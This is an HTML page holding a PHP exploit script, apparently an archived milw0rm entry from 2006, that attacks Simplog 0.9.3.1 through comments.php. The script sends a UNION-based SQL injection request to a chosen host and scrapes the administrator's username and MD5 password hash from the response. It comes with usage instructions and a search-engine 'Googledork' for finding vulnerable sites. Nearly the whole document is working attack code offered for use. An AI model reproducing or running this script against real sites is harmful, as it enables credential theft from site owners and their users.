<html><head><title>Simplog <= 0.9.3.1 comments.php Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/php
&lt;?php
 /*********************************************************************
 * Simplog 0.9.3.1 Remote SQL Injection Vulnerability 
 * 
 * Note:
 * Requires at least one blog entry to be made prior to injection
 *
 * Usage: 
 * php script.php [host] [path] [user id]
 *
 * Usage Example:
 * php script.php domain.com /simplog/ 1
 *
 * Googledork:
 * intext:Powered by Simplog
 *
 * Credits:
 * Disfigure - Vulnerability research and discovery
 * Synsta - Exploit scripting
 * 
 * [w4ck1ng] - w4ck1ng.com
 *********************************************************************/

if(!$argv[3 ]){
die(&quot;Usage:
php $argv[0] [host] [path] [user id]\n
Usage Example:
php $argv[0] domain.com /simplog/ 1\n&quot;);
}

if($argv[3]){

function send($host, $put){
global $data;
$conn = fsockopen( gethostbyname($host),&quot;80&quot; );
if(!$conn) {
die(&quot;Connection to $host failed...&quot;);
}else{
fputs($conn, $put);
}
while(!feof($conn)) {
$data .=fgets( $conn);
}
fclose($conn);
return $data;
}

$host = $argv[ 1];
$path = $argv[ 2];
$userid = $argv[ 3];

$sql = urlencode( &quot;-1 union select 9,9,9,login,9,password,9,9 from blog_users where admin=$userid&quot;);
$req =  &quot;GET &quot;. $path.&quot;comments.php?op=edit&amp;cid=&quot;. &quot;$sql HTTP/1.1\r\n&quot;;
$req .= &quot;Host: $host\r\n&quot;;
//$req .= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
$req .= &quot;Content-Type: text/plain\r\n&quot; ;
$req .= &quot;Connection: Close\r\n\r\n&quot; ;
send(&quot;$host&quot;, &quot;$req&quot;);

$aname = explode( &quot;&gt;&lt;input type=text name=cname maxlength=64 value=\&quot;&quot;,$data);
$bname = explode( &quot;\&quot;&gt;&quot;,$aname[1 ]);
$name = $bname[ 0];
$ahash = explode( &quot;&lt;textarea name=comment rows=10 cols=40 wrap=physical&gt;&quot;,$data);
$bhash = explode( &quot;&lt;/textarea&gt;&quot;,$ahash[1 ]);
$hash = $bhash[ 0];

if(strlen($hash) !=  32){ 
die(&quot;Exploit failed..\n&quot;); 
}else{ 
die(&quot;Username: $name MD5: $hash\n&quot;); 
}
}
?&gt;

# milw0rm.com [2006-10-16]</pre></html>